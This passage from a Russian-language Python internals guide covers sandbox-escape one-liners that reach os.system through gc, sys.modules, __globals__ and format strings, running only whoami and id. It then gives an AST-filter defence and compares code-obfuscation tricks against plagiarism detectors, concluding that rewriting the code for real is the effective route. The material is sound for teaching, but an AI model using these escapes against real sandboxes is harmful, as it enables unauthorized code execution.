+<div class="language-python highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="c1"># 1. gc.get_objects() — все объекты в куче</span>
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="kn">import</span> <span class="nn">gc</span>
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="k">for</span> <span class="n">obj</span> <span class="ow">in</span> <span class="n">gc</span><span class="o">.</span><span class="n">get_objects</span><span class="p">():</span>
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>    <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="s2">&quot;__name__&quot;</span><span class="p">)</span> <span class="ow">and</span> <span class="n">obj</span><span class="o">.</span><span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;system&quot;</span><span class="p">:</span>
+</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>        <span class="n">obj</span><span class="p">(</span><span class="s2">&quot;whoami&quot;</span><span class="p">)</span>  <span class="c1"># нашёл os.system в куче</span>
+</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>
+</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a><span class="c1"># 2. sys.modules — если модуль хоть раз импортировался</span>
+</span><span id="__span-22-8"><a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a><span class="kn">import</span> <span class="nn">sys</span>
+</span><span id="__span-22-9"><a id="__codelineno-22-9" name="__codelineno-22-9" href="#__codelineno-22-9"></a><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s2">&quot;os&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;whoami&quot;</span><span class="p">)</span>
+</span><span id="__span-22-10"><a id="__codelineno-22-10" name="__codelineno-22-10" href="#__codelineno-22-10"></a>
+</span><span id="__span-22-11"><a id="__codelineno-22-11" name="__codelineno-22-11" href="#__codelineno-22-11"></a><span class="c1"># 3. license() / help() / copyright() — _Printer объекты с __globals__</span>
+</span><span id="__span-22-12"><a id="__codelineno-22-12" name="__codelineno-22-12" href="#__codelineno-22-12"></a><span class="n">copyright</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s2">&quot;__builtins__&quot;</span><span class="p">][</span><span class="s2">&quot;__import__&quot;</span><span class="p">](</span><span class="s2">&quot;os&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;whoami&quot;</span><span class="p">)</span>
+</span><span id="__span-22-13"><a id="__codelineno-22-13" name="__codelineno-22-13" href="#__codelineno-22-13"></a>
+</span><span id="__span-22-14"><a id="__codelineno-22-14" name="__codelineno-22-14" href="#__codelineno-22-14"></a><span class="c1"># 4. Через format string vulnerability — утечка атрибутов через __globals__:</span>
+</span><span id="__span-22-15"><a id="__codelineno-22-15" name="__codelineno-22-15" href="#__codelineno-22-15"></a><span class="c1">#    ВАЖНО: list.__init__ — C-level slot wrapper, у него НЕТ __globals__,</span>
+</span><span id="__span-22-16"><a id="__codelineno-22-16" name="__codelineno-22-16" href="#__codelineno-22-16"></a><span class="c1">#    поэтому `.format([])` НЕ работает. Нужен объект Python-level класса,</span>
+</span><span id="__span-22-17"><a id="__codelineno-22-17" name="__codelineno-22-17" href="#__codelineno-22-17"></a><span class="c1">#    чей __init__ — обычная функция:</span>
+</span><span id="__span-22-18"><a id="__codelineno-22-18" name="__codelineno-22-18" href="#__codelineno-22-18"></a><span class="kn">import</span> <span class="nn">subprocess</span>
+</span><span id="__span-22-19"><a id="__codelineno-22-19" name="__codelineno-22-19" href="#__codelineno-22-19"></a><span class="s2">&quot;</span><span class="si">{0.__init__.__globals__[os].system}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">)</span>
+</span><span id="__span-22-20"><a id="__codelineno-22-20" name="__codelineno-22-20" href="#__codelineno-22-20"></a><span class="c1"># → &#39;&lt;built-in function system&gt;&#39; — format-string превращает атрибут в repr.</span>
+</span><span id="__span-22-21"><a id="__codelineno-22-21" name="__codelineno-22-21" href="#__codelineno-22-21"></a><span class="c1"># Это утечка информации (можно читать __globals__ целиком как строку),</span>
+</span><span id="__span-22-22"><a id="__codelineno-22-22" name="__codelineno-22-22" href="#__codelineno-22-22"></a><span class="c1"># но **не RCE сама по себе** — для выполнения команды нужно ещё вызвать</span>
+</span><span id="__span-22-23"><a id="__codelineno-22-23" name="__codelineno-22-23" href="#__codelineno-22-23"></a><span class="c1"># полученную ссылку. Для RCE через format-string нужна отдельная прокси-функция</span>
+</span><span id="__span-22-24"><a id="__codelineno-22-24" name="__codelineno-22-24" href="#__codelineno-22-24"></a><span class="c1"># или `__format__` с побочным эффектом у целевого объекта.</span>
+</span><span id="__span-22-25"><a id="__codelineno-22-25" name="__codelineno-22-25" href="#__codelineno-22-25"></a>
+</span><span id="__span-22-26"><a id="__codelineno-22-26" name="__codelineno-22-26" href="#__codelineno-22-26"></a><span class="c1"># 5. Через catch_warnings:</span>
+</span><span id="__span-22-27"><a id="__codelineno-22-27" name="__codelineno-22-27" href="#__codelineno-22-27"></a><span class="kn">import</span> <span class="nn">warnings</span>
+</span><span id="__span-22-28"><a id="__codelineno-22-28" name="__codelineno-22-28" href="#__codelineno-22-28"></a><span class="n">warnings</span><span class="o">.</span><span class="n">catch_warnings</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s2">&quot;__builtins__&quot;</span><span class="p">][</span><span class="s2">&quot;__import__&quot;</span><span class="p">](</span><span class="s2">&quot;os&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;id&quot;</span><span class="p">)</span>
+</span></code></pre></div>
+<h3 id="zaschita">Защита: почему это сложно заблокировать<a class="headerlink" href="#zaschita" title="Permanent link">#</a></h3>
+<ol>
+<li>
+<p><strong><code>__class__</code>, <code>__base__</code>, <code>__subclasses__</code> — это базовые протоколы Python</strong>. Заблокировать их — значит сломать <code>isinstance</code>, <code>type()</code>, наследование. Реалистичная блокировка требует AST-фильтрации (Часть VII, 7.13) с запретом доступа к любым dunder-атрибутам.</p>
+</li>
+<li>
+<p><strong>Любой объект работает как точка входа</strong>: <code>().__class__</code>, <code>[].__class__</code>, <code>(0).__class__</code>, <code>True.__class__</code>, <code>len.__class__</code>, даже <code>None.__class__</code> — все ведут к <code>object</code>. Заблокировать все стартовые объекты невозможно (они в <code>__builtins__</code>).</p>
+</li>
+<li>
+<p><strong>Альтернативные пути</strong> не ограничиваются <code>__subclasses__()</code> — <code>gc</code>, <code>sys.modules</code>, <code>__globals__</code> на любом function/method, format-strings — все ведут к arbitrary code execution.</p>
+</li>
+</ol>
+<h3 id="minimalnaya">Минимальная защита песочницы<a class="headerlink" href="#minimalnaya" title="Permanent link">#</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">builtins</span><span class="o">,</span> <span class="nn">ast</span>
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="c1"># 1. Ограниченный __builtins__</span>
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="n">safe_builtins</span> <span class="o">=</span> <span class="p">{</span>
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>    <span class="s1">&#39;print&#39;</span><span class="p">:</span> <span class="nb">print</span><span class="p">,</span> <span class="s1">&#39;len&#39;</span><span class="p">:</span> <span class="nb">len</span><span class="p">,</span> <span class="s1">&#39;range&#39;</span><span class="p">:</span> <span class="nb">range</span><span class="p">,</span> <span class="s1">&#39;int&#39;</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="s1">&#39;str&#39;</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
+</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>    <span class="s1">&#39;list&#39;</span><span class="p">:</span> <span class="nb">list</span><span class="p">,</span> <span class="s1">&#39;dict&#39;</span><span class="p">:</span> <span class="nb">dict</span><span class="p">,</span> <span class="s1">&#39;tuple&#39;</span><span class="p">:</span> <span class="nb">tuple</span><span class="p">,</span> <span class="s1">&#39;set&#39;</span><span class="p">:</span> <span class="nb">set</span><span class="p">,</span> <span class="s1">&#39;bool&#39;</span><span class="p">:</span> <span class="nb">bool</span><span class="p">,</span>
+</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a>    <span class="s1">&#39;enumerate&#39;</span><span class="p">:</span> <span class="nb">enumerate</span><span class="p">,</span> <span class="s1">&#39;zip&#39;</span><span class="p">:</span> <span class="nb">zip</span><span class="p">,</span> <span class="s1">&#39;map&#39;</span><span class="p">:</span> <span class="nb">map</span><span class="p">,</span> <span class="s1">&#39;filter&#39;</span><span class="p">:</span> <span class="nb">filter</span><span class="p">,</span>
+</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a>    <span class="s1">&#39;sum&#39;</span><span class="p">:</span> <span class="nb">sum</span><span class="p">,</span> <span class="s1">&#39;min&#39;</span><span class="p">:</span> <span class="nb">min</span><span class="p">,</span> <span class="s1">&#39;max&#39;</span><span class="p">:</span> <span class="nb">max</span><span class="p">,</span> <span class="s1">&#39;sorted&#39;</span><span class="p">:</span> <span class="nb">sorted</span><span class="p">,</span> <span class="s1">&#39;reversed&#39;</span><span class="p">:</span> <span class="nb">reversed</span><span class="p">,</span>
+</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a>    <span class="s1">&#39;abs&#39;</span><span class="p">:</span> <span class="nb">abs</span><span class="p">,</span> <span class="s1">&#39;round&#39;</span><span class="p">:</span> <span class="nb">round</span><span class="p">,</span> <span class="s1">&#39;True&#39;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span> <span class="s1">&#39;False&#39;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span> <span class="s1">&#39;None&#39;</span><span class="p">:</span> <span class="kc">None</span><span class="p">,</span>
+</span><span id="__span-23-10"><a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a>    <span class="s1">&#39;isinstance&#39;</span><span class="p">:</span> <span class="nb">isinstance</span><span class="p">,</span> <span class="s1">&#39;TypeError&#39;</span><span class="p">:</span> <span class="ne">TypeError</span><span class="p">,</span> <span class="s1">&#39;ValueError&#39;</span><span class="p">:</span> <span class="ne">ValueError</span><span class="p">,</span>
+</span><span id="__span-23-11"><a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a>    <span class="c1"># Никаких: __import__, eval, exec, compile, open, getattr, setattr, type,</span>
+</span><span id="__span-23-12"><a id="__codelineno-23-12" name="__codelineno-23-12" href="#__codelineno-23-12"></a>    <span class="c1">#          globals, locals, vars, dir, hasattr, delattr, input</span>
+</span><span id="__span-23-13"><a id="__codelineno-23-13" name="__codelineno-23-13" href="#__codelineno-23-13"></a><span class="p">}</span>
+</span><span id="__span-23-14"><a id="__codelineno-23-14" name="__codelineno-23-14" href="#__codelineno-23-14"></a>
+</span><span id="__span-23-15"><a id="__codelineno-23-15" name="__codelineno-23-15" href="#__codelineno-23-15"></a><span class="n">sandbox_globals</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">:</span> <span class="n">safe_builtins</span><span class="p">}</span>
+</span><span id="__span-23-16"><a id="__codelineno-23-16" name="__codelineno-23-16" href="#__codelineno-23-16"></a>
+</span><span id="__span-23-17"><a id="__codelineno-23-17" name="__codelineno-23-17" href="#__codelineno-23-17"></a><span class="c1"># 2. AST-фильтрация исходника (см. 7.13) — запретить доступ к dunder-атрибутам</span>
+</span><span id="__span-23-18"><a id="__codelineno-23-18" name="__codelineno-23-18" href="#__codelineno-23-18"></a><span class="k">class</span> <span class="nc">SandboxTransformer</span><span class="p">(</span><span class="n">ast</span><span class="o">.</span><span class="n">NodeTransformer</span><span class="p">):</span>
+</span><span id="__span-23-19"><a id="__codelineno-23-19" name="__codelineno-23-19" href="#__codelineno-23-19"></a>    <span class="n">FORBIDDEN</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;__class__&#39;</span><span class="p">,</span> <span class="s1">&#39;__base__&#39;</span><span class="p">,</span> <span class="s1">&#39;__subclasses__&#39;</span><span class="p">,</span> <span class="s1">&#39;__globals__&#39;</span><span class="p">,</span>
+</span><span id="__span-23-20"><a id="__codelineno-23-20" name="__codelineno-23-20" href="#__codelineno-23-20"></a>                 <span class="s1">&#39;__builtins__&#39;</span><span class="p">,</span> <span class="s1">&#39;__import__&#39;</span><span class="p">,</span> <span class="s1">&#39;__code__&#39;</span><span class="p">,</span> <span class="s1">&#39;__mro__&#39;</span><span class="p">,</span>
+</span><span id="__span-23-21"><a id="__codelineno-23-21" name="__codelineno-23-21" href="#__codelineno-23-21"></a>                 <span class="s1">&#39;__dict__&#39;</span><span class="p">,</span> <span class="s1">&#39;__init_subclass__&#39;</span><span class="p">}</span>
+</span><span id="__span-23-22"><a id="__codelineno-23-22" name="__codelineno-23-22" href="#__codelineno-23-22"></a>    <span class="k">def</span> <span class="nf">visit_Attribute</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">node</span><span class="p">):</span>
+</span><span id="__span-23-23"><a id="__codelineno-23-23" name="__codelineno-23-23" href="#__codelineno-23-23"></a>        <span class="k">if</span> <span class="n">node</span><span class="o">.</span><span class="n">attr</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">FORBIDDEN</span><span class="p">:</span>
+</span><span id="__span-23-24"><a id="__codelineno-23-24" name="__codelineno-23-24" href="#__codelineno-23-24"></a>            <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Доступ к </span><span class="si">{</span><span class="n">node</span><span class="o">.</span><span class="n">attr</span><span class="si">}</span><span class="s2"> запрещён&quot;</span><span class="p">)</span>
+</span><span id="__span-23-25"><a id="__codelineno-23-25" name="__codelineno-23-25" href="#__codelineno-23-25"></a>        <span class="k">return</span> <span class="n">node</span>
+</span><span id="__span-23-26"><a id="__codelineno-23-26" name="__codelineno-23-26" href="#__codelineno-23-26"></a>    <span class="c1"># Также запретить import</span>
+</span><span id="__span-23-27"><a id="__codelineno-23-27" name="__codelineno-23-27" href="#__codelineno-23-27"></a>    <span class="k">def</span> <span class="nf">visit_Import</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">node</span><span class="p">):</span>
+</span><span id="__span-23-28"><a id="__codelineno-23-28" name="__codelineno-23-28" href="#__codelineno-23-28"></a>        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&quot;import запрещён&quot;</span><span class="p">)</span>
+</span><span id="__span-23-29"><a id="__codelineno-23-29" name="__codelineno-23-29" href="#__codelineno-23-29"></a>    <span class="k">def</span> <span class="nf">visit_ImportFrom</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">node</span><span class="p">):</span>
+</span><span id="__span-23-30"><a id="__codelineno-23-30" name="__codelineno-23-30" href="#__codelineno-23-30"></a>        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&quot;from ... import запрещён&quot;</span><span class="p">)</span>
+</span><span id="__span-23-31"><a id="__codelineno-23-31" name="__codelineno-23-31" href="#__codelineno-23-31"></a>
+</span><span id="__span-23-32"><a id="__codelineno-23-32" name="__codelineno-23-32" href="#__codelineno-23-32"></a><span class="n">code</span> <span class="o">=</span> <span class="s2">&quot;print(1 + 2)&quot;</span>
+</span><span id="__span-23-33"><a id="__codelineno-23-33" name="__codelineno-23-33" href="#__codelineno-23-33"></a><span class="n">tree</span> <span class="o">=</span> <span class="n">ast</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
+</span><span id="__span-23-34"><a id="__codelineno-23-34" name="__codelineno-23-34" href="#__codelineno-23-34"></a><span class="n">SandboxTransformer</span><span class="p">()</span><span class="o">.</span><span class="n">visit</span><span class="p">(</span><span class="n">tree</span><span class="p">)</span>
+</span><span id="__span-23-35"><a id="__codelineno-23-35" name="__codelineno-23-35" href="#__codelineno-23-35"></a><span class="n">ast</span><span class="o">.</span><span class="n">fix_missing_locations</span><span class="p">(</span><span class="n">tree</span><span class="p">)</span>
+</span><span id="__span-23-36"><a id="__codelineno-23-36" name="__codelineno-23-36" href="#__codelineno-23-36"></a><span class="n">exec</span><span class="p">(</span><span class="nb">compile</span><span class="p">(</span><span class="n">tree</span><span class="p">,</span> <span class="s2">&quot;&lt;sandbox&gt;&quot;</span><span class="p">,</span> <span class="s2">&quot;exec&quot;</span><span class="p">),</span> <span class="n">sandbox_globals</span><span class="p">)</span>
+</span></code></pre></div>
+<p>⚠️ <strong>Реалистичная оценка</strong>: AST-фильтрация + ограниченный <code>__builtins__</code> защищают от 90% тривиальных обходов, но не от целенаправленной атаки. Для реальной изоляции — отдельный процесс (subprocess с <code>--no-site</code>, seccomp-фильтр, separate user namespace), либо отдельная VM. Python-уровневая песочница — это учебный пример, не production-защита.</p>
+<h2 id="b6">B.6. Что работает, а что нет — реалистичная оценка<a class="headerlink" href="#b6" title="Permanent link">#</a></h2>
+<h3 id="effektivnost">Эффективность приёмов против разных систем<a class="headerlink" href="#effektivnost" title="Permanent link">#</a></h3>
+<table>
+<thead>
+<tr>
+<th>Приём</th>
+<th>Winnowing (A.1)</th>
+<th>AST-нормализация (A.5)</th>
+<th>Динамический анализ (A.7)</th>
+<th>Стилометрия (A.6)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Переименование</td>
+<td>❌ не работает</td>
+<td>❌</td>
+<td>❌</td>
+<td>⚠️ (стиль имён)</td>
+</tr>
+<tr>
+<td>Inlining/outlining</td>
+<td>⚠️ частично</td>
+<td>❌</td>
+<td>❌</td>
+<td>✅ работает</td>
+</tr>
+<tr>
+<td>Замена <code>for</code>→<code>while</code></td>
+<td>⚠️</td>
+<td>❌</td>
+<td>❌</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>Мёртвый код</td>
+<td>✅</td>
+<td>❌ (DCE)</td>
+<td>❌</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>Замена библиотек</td>
+<td>✅</td>
+<td>⚠️</td>
+<td>❌</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>Аннотации как данные</td>
+<td>✅</td>
+<td>✅</td>
+<td>⚠️</td>
+<td>✅</td>
+</tr>
+<tr>
+<td><code>exec</code> из строки</td>
+<td>✅</td>
+<td>✅</td>
+<td>⚠️</td>
+<td>✅</td>
+</tr>
+<tr>
+<td><code>types.FunctionType</code></td>
+<td>✅</td>
+<td>✅</td>
+<td>⚠️</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>Перехват фреймов</td>
+<td>✅</td>
+<td>✅</td>
+<td>⚠️</td>
+<td>✅</td>
+</tr>
+</tbody>
+</table>
+<p>✅ = приём работает (обходит детекцию), ❌ = не работает (система видит сквозь), ⚠️ = частично.</p>
+<p><strong>Вывод</strong>: против современных систем (MOSS, JPlag, Dolos) с AST-нормализацией косметика <strong>не работает</strong>. Архитектурные приёмы (<code>exec</code>, <code>types.FunctionType</code>) обходят статический анализ, но <strong>привлекают внимание</strong> — <code>exec</code> в студенческом коде — красный флаг. Динамический анализ (если система его применяет) видит всё.</p>
+<h3 id="chto">Что точно НЕ стоит делать<a class="headerlink" href="#chto" title="Permanent link">#</a></h3>
+<ul>
+<li><strong><code>exec</code> в студенческом коде</strong> — мгновенно привлекает внимание преподавателя, даже если антиплагиат не сработал.</li>
+<li><strong><code>__subclasses__()</code> обход</strong> — работает только в sandboxed окружениях, в обычной тестирующей системе бесполезен.</li>
+<li><strong>Перехват фреймов</strong> — требует <code>sys._getframe</code>, который часто заблокирован.</li>
+<li><strong>Массовое переименование в <code>a</code>, <code>b</code>, <code>c</code></strong> — стилометрия (A.6) помечает как «стиль обфускатора».</li>
+<li><strong>Мёртвый код в больших количествах</strong> — cycle complexity (A.4) растёт, метрики Хальстеда (A.3) аномальны.</li>
+</ul>
+<h3 id="zelenaya">Зелёная зона — что легально и эффективно<a class="headerlink" href="#zelenaya" title="Permanent link">#</a></h3>
+<p>Если задача — не «обойти систему проверки», а «написать код так, чтобы он был <strong>своим</strong>»:</p>
+<ol>
+<li><strong>Понять алгоритм</strong> и написать с нуля — не смотреть на оригинал.</li>
+<li><strong>Использовать другой стиль</strong> — list comprehension вместо for-loop, <code>dataclass</code> вместо dict, <code>match/case</code> вместо if-elif. Это легально и меняет AST.</li>
+<li><strong>Другие структуры данных</strong> — <code>deque</code> вместо <code>list</code>, <code>Counter</code> вместо <code>dict</code>, <code>heapq</code> вместо <code>sorted</code>.</li>
+<li><strong>Другие библиотеки</strong> — если оригинал на <code>requests</code>, переписать на <code>httpx</code> или <code>urllib</code>.</li>
+<li><strong>Добавить обработку ошибок</strong> — <code>try/except</code>, валидацию, logging. Это меняет структуру и улучшает код.</li>
+<li><strong>Юнит-тесты</strong> — если есть тесты, код явно «свой», и преподаватель это видит.</li>
+</ol>
+<p>Эти приёмы не «обманывают» системы проверки — они делают код <strong>действительно другим</strong>, что и есть цель проверки.</p>
+<hr />
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  К началу
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+    
+    
+    <a href="https://github.com/n3xumc0r3/py-underhood" target="_blank" rel="noopener" title="GitHub репозиторий" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.prev_next", "navigation.top", "navigation.tracking", "navigation.indexes", "toc.follow", "search.suggest", "search.highlight", "content.code.copy", "content.code.annotate", "content.tooltips", "content.action.edit", "content.action.view"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "\u0421\u043a\u043e\u043f\u0438\u0440\u043e\u0432\u0430\u043d\u043e \u0432 \u0431\u0443\u0444\u0435\u0440", "clipboard.copy": "\u041a\u043e\u043f\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u0432 \u0431\u0443\u0444\u0435\u0440", "search.result.more.one": "\u0415\u0449\u0451 1 \u043d\u0430 \u044d\u0442\u043e\u0439 \u0441\u0442\u0440\u0430\u043d\u0438\u0446\u0435", "search.result.more.other": "\u0415\u0449\u0451 # \u043d\u0430 \u044d\u0442\u043e\u0439 \u0441\u0442\u0440\u0430\u043d\u0438\u0446\u0435", "search.result.none": "\u0421\u043e\u0432\u043f\u0430\u0434\u0435\u043d\u0438\u0439 \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d\u043e", "search.result.one": "\u041d\u0430\u0439\u0434\u0435\u043d\u043e 1 \u0441\u043e\u0432\u043f\u0430\u0434\u0435\u043d\u0438\u0435", "search.result.other": "\u041d\u0430\u0439\u0434\u0435\u043d\u043e \u0441\u043e\u0432\u043f\u0430\u0434\u0435\u043d\u0438\u0439: #", "search.result.placeholder": "\u041d\u0430\u0447\u043d\u0438\u0442\u0435 \u043f\u0435\u0447\u0430\u0442\u0430\u0442\u044c \u0434\u043b\u044f \u043f\u043e\u0438\u0441\u043a\u0430", "search.result.term.missing": "\u041e\u0442\u0441\u0443\u0442\u0441\u0442\u0432\u0443\u0435\u0442", "select.version": "\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u0432\u0435\u0440\u0441\u0438\u044e"}}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.88dd0f4e.min.js"></script>
+      
+        <script src="../javascripts/extra.js"></script>
+      
+    
+  </body>
+</html>
